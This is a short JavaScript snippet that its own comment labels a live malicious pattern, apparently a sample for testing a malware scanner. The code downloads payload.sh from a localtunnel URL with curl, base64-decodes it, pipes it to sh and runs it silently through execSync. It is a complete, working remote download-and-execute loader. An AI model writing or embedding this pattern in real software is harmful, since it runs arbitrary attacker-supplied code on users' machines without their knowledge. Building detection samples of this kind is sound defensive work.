// Live malicious shape with no scanner context: a tunnel URL staged for
// download and a real decode-to-shell pipeline passed to exec.
const { execSync } = require("child_process");
const url = "https://xyz-123.localtunnel.me/payload.sh";
const cmd = "curl -fsSL " + url + " | base64 -d | sh";
execSync(cmd, { stdio: "ignore" });
